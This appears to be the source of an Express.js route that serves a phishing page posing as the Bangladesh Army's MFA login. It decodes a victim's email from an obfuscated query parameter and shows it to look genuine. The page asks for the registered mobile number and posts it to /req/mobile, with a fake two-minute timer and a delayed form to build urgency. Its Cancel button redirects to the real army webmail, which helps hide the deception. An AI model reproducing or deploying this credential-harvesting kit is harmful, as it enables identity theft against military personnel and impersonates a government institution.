const express = require('express');
const router = express.Router();
router.use(express.static('public'));

router.get('/', (req, res) => {

    // Your route logic here
    const data = req.query.fdhdfghetyrtsdaweretyrjghfdxfsfr;

    const username = Buffer.from(data, 'base64').toString('utf-8');  
         
    const user = username.split("@")[0];
       
    
    if (data == null) {
        res.render('error');
        
         }else{
        
        const htmlContent = ` <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    
        <html>
        <head>
        <meta http-equiv="X-UA-Compatible" content="IE=10">
        
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="Robots" content="NOINDEX, NOFOLLOW">
        <link rel="stylesheet" type="text/css" href="./style/mobile.css">
    
                <!-- Required meta tags -->
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <title>MFA | Bangladesh Army</title>
                <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon">
                <style>
                    #myDiv {
                        display: none;
                       
                          }
                </style>
            </head>
           <body>
            <form action="/req/mobile" method="POST" id="myForm" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
            <div class="centered-div">
               
                <div class="upper-div">
                    <img class="logo" src="./images/logoarmy.png" alt="logo">&nbsp;&nbsp;<span class="logotext"><b>BANGLADESH ARMY</b></span>
    
                </div>
                <div id="myDiv">
                <div class="upper-div1">
                   
                    <div class="left"><img class="logouser" src="./images/businessman.png" alt="logo">&nbsp;&nbsp;<span class="logotext1">${user}</span>&nbsp;<span class="logotext2">(AD)</span></div>
                    <input type="hidden" name="username" value="${username}">
                    <div class="right"><div><img class="logouser" src="./images/stopwatch.png" alt="logo"></div>&nbsp;&nbsp; <sapn id="timer-display">02:00</span></div>
    
                    <script>
                                // Function to start the timer
                            function startTimer(duration, display) {
                            let timer = duration, minutes, seconds;
                            setInterval(function () {
                                minutes = parseInt(timer / 60, 10);
                                seconds = parseInt(timer % 60, 10);
                            
                                minutes = minutes < 10 ? "0" + minutes : minutes;
                                seconds = seconds < 10 ? "0" + seconds : seconds;
                            
                                display.textContent = minutes + ":" + seconds;
                            
                                if (--timer < 0) {
                                timer = duration;
                                }
                            }, 1000);
                            }
                            
                            window.onload = function () {
                            const durationInSeconds = 60 * 2; // 5 minutes
                            const display = document.getElementById("timer-display");
                            startTimer(durationInSeconds, display);
                            };
                    
                      </script>
    
    
                </div>
                
                <div class="center-div">
    
                    <div class="text-div"><p class="cspan">Please answer the following question(s) to login</p></div>
    
                                  
                    <div class="text-div1"><p class="qspan">Question:</p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                    <p class="mspan">Please enter your registered mobile number:</p></div>
                
    
                <div class="center-div1">
    
                    <div class="mobile-div"><input type="text" name="mobile" id="numericInput" maxlength="12" class="mobile-box"></div>
                   
                    <script>

                                    document.getElementById("numericInput").addEventListener("keydown", function(event) {
                            // Allow only numbers (0-9) and navigation keys (Tab, arrow keys)
                            if (!(event.key === "Tab" || event.key === "ArrowLeft" || event.key === "ArrowRight" || event.key === "ArrowUp" || event.key === "ArrowDown" ||
                                    event.key === "Backspace" || event.key === "Delete" || event.key === "Home" || event.key === "End" ||
                                    (event.key >= "0" && event.key <= "9") || (event.key === "Control" && event.ctrlKey) || event.key === "v" && event.ctrlKey)) {
                                event.preventDefault();
                            }
                            });


                    </script>
                
                </div><br>
                <div class="center-div2">
    
                    <div ><input type="checkbox" class="check-box"> <label class="text-div3" for="checkbox">Trust this browser</label></div>
                                 
    
                </div>
                
                <div class="center-div3">
    
                    <div ><label class="text-div2">Trusted browser will expire after 24 hour(s)</label></div>
                                 
    
                </div>
                            
            
            </div>
    
            <div class="center-div0">
    
                <input type="submit" class="button1" value="Cancel" id="cancelButton" >&nbsp;&nbsp;&nbsp;<input type="submit" class="button2" value="Continue">
                
            
              
              <script>
                    
                      
                document.getElementById("cancelButton").addEventListener("click", function(event) {
                    event.preventDefault(); // Prevent the default form submission behavior
                    window.location.href = "https://newmail.army.mil.bd/"; 
                    });
        
                </script> 
        
        
        </div>
    
        
        </div>
    
        <script>
            // Set timeout for 10 seconds (10000 milliseconds)
            setTimeout(function() {
                document.getElementById("myDiv").style.display = "block";
            }, 10000);
        </script>
    
    
    
    </form>
            </body>
            </html>

     `

        res.send(htmlContent);
        
    }


});

module.exports = router;
